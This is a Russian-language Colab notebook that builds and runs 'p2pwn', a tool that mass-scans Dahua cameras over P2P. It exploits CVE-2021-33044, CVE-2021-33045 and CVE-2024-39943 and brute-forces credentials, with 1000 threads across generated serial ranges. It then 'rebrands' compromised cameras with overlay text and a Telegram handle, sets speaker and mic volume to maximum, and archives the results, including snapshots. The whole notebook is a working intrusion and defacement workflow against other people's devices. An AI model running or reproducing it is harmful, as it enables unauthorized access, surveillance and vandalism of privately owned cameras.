# 🎯 p2pwn — Dahua Camera Scanner

<b>Массовый скан и брендинг камер Dahua через P2P</b><br>CVE-2021-33044 • CVE-2021-33045 • CVE-2024-39943 • Brute Force

---

**Использование:** запускай ячейки по порядку ⬇️


## 📦 Шаг 1: Установка

Скачивает Go, клонирует репозиторий и собирает p2pwn.


In [ ]:
# @title ⚙️ Установка (запусти один раз)
#@markdown Устанавливает Go и собирает p2pwn

import os

GO_VERSION = "1.26.0"

!wget -q https://go.dev/dl/go{GO_VERSION}.linux-amd64.tar.gz
!tar -C /usr/local -xzf go{GO_VERSION}.linux-amd64.tar.gz
os.environ["PATH"] = "/usr/local/go/bin:" + os.environ["PATH"]
!rm -f go{GO_VERSION}.linux-amd64.tar.gz

!apt install -y -qq git > /dev/null 2>&1
!git clone -q https://github.com/scq2x/p2pwn.git
%cd p2pwn
!go mod download -q
!go build -o p2pwn

print("
✅ Готово! p2pwn собран.")
!./p2pwn --help


## ⚙️ Шаг 2: Конфигурация

Настрой брендинг (channel title + overlay) и аудио.

**Плейсхолдеры:** `{serial}` — серийный номер, `{model}` — модель камеры


In [ ]:
# @title 🎨 Настройка бренда
#@markdown Channel title и overlay text для pwned камер

import re

CONFIG_PATH = "/content/p2pwn/config.toml"

brand_enabled = True  # @param {type:"boolean"}
channel_title = "#BOUQUET WORLDWIDE"  # @param {type:"string"}

#@markdown Overlay text (до 4 строк):
overlay_1 = "BOUQUET4LIFE"  # @param {type:"string"}
overlay_2 = "t.me/bouquet2t"  # @param {type:"string"}
overlay_3 = "BOUQUET4LIFE"  # @param {type:"string"}
overlay_4 = "t.me/bouquet2t"  # @param {type:"string"}

audio_enabled = True  # @param {type:"boolean"}
speaker_volume = 100  # @param {type:"integer", minimum:0, maximum:100}
mic_volume = 100  # @param {type:"integer", minimum:0, maximum:100}

overlay_lines = [overlay_1, overlay_2, overlay_3, overlay_4]
overlay_text = str([l for l in overlay_lines if l])

with open(CONFIG_PATH, "r") as f:
    content = f.read()

brand_block = f"""[brand]
enabled = {str(brand_enabled).lower()}
channel_title = "{channel_title}"
overlay_text = {overlay_text}"""

content = re.sub(r"[brand].*?(?=
[|$)", brand_block.rstrip(), content, flags=re.DOTALL)

audio_block = f"""[audio]
enabled = {str(audio_enabled).lower()}
speaker_volume = {speaker_volume}
mic_volume = {mic_volume}"""

content = re.sub(r"[audio].*?(?=
[|$)", audio_block.rstrip(), content, flags=re.DOTALL)

with open(CONFIG_PATH, "w") as f:
    f.write(content)

print("✅ Конфиг обновлён!
")
print(f"  📺 Channel Title: {channel_title}")
print(f"  📝 Overlay: {overlay_text}")
print(f"  🔊 Audio: speaker={speaker_volume}, mic={mic_volume}")


## 🔍 Шаг 3: Скан

Введи префиксы или серийные номера камер через запятую.

**Формат:**
- `XXXXXXXXXX` — префикс (10 символов) → генерирует до 1M серийников
- `XXXXXXXXXXYYYYY` — полный серийник (15 символов)


In [ ]:
# @title 🚀 Запуск скана
#@markdown Введи префиксы или серийники через запятую

input = "4L061ADPAJ,4F05EC9PAJ,3J0767CPAG"  # @param {type:"string"}
threads = 1000  # @param {type:"integer"}

!./p2pwn -i {input} -t {threads}


## 🎨 Шаг 4: Ребрендинг

Переподключается к просканированным камерам и применяет branding + audio.

**Когда использовать:**
- Камеры были просканированы без бренда
- Бренд применился не ко всем камерам
- Хочешь изменить текст на уже pwned камерах


In [ ]:
# @title 🔄 Список папок для ребрендинга
#@markdown Показывает все просканированные папки

import os
import glob

scan_folders = []
for pwned_file in glob.glob("/content/p2pwn/*/pwned.txt"):
    folder = os.path.dirname(pwned_file)
    scan_folders.append(os.path.basename(folder))

if not scan_folders:
    print("❌ Папки с результатами скана не найдены")
    print("   Сначала запусти скан")
else:
    print("📁 Найдены папки со сканами:
")
    for i, folder in enumerate(scan_folders, 1):
        pwned_path = f"/content/p2pwn/{folder}/pwned.txt"
        with open(pwned_path, "r") as f:
            count = sum(1 for line in f if line.strip() and not line.startswith("#"))
        print(f"  {i}. {folder} ({count} камер)")
    print(f"
Всего: {len(scan_folders)} папок")


In [ ]:
# @title ▶️ Запуск ребрендинга
#@markdown Введи имя папки из списка выше

scan_folder = ""  # @param {type:"string"}

if not scan_folder:
    print("❌ Введи имя папки (из списка выше)")
else:
    pwned_path = f"/content/p2pwn/{scan_folder}/pwned.txt"
    if not os.path.exists(pwned_path):
        print(f"❌ pwned.txt не найден в {scan_folder}")
    else:
        print(f"🔄 Ребрендинг {scan_folder}...
")
        !./p2pwn -b -o /content/p2pwn/{scan_folder}


## 📁 Шаг 5: Архивация

Упаковывает все результаты (pwned.txt, snapshots, xml) в zip.


In [ ]:
# @title 📦 Архивация результатов

import os
import zipfile
import glob

archive_name = "results"  # @param {type:"string"}

root = "/content/p2pwn"
archive_path = f"/content/{archive_name}.zip"

count = 0
with zipfile.ZipFile(archive_path, "w", zipfile.ZIP_DEFLATED) as zf:
    for pwned_file in glob.glob(f"{root}/*/pwned.txt"):
        folder = os.path.dirname(pwned_file)
        for dirpath, _, filenames in os.walk(folder):
            for filename in filenames:
                filepath = os.path.join(dirpath, filename)
                arcname = os.path.relpath(filepath, root)
                zf.write(filepath, arcname)
        count += 1

if count > 0:
    size = os.path.getsize(archive_path) / (1024 * 1024)
    print(f"✅ Архив создан: {archive_path}")
    print(f"   Папок: {count}")
    print(f"   Размер: {size:.1f} MB")
else:
    print("❌ Папки с результатами не найдены")


---

<b>p2pwn</b> • GPL v3.0 • <a href="https://github.com/scq2x/p2pwn">GitHub</a>
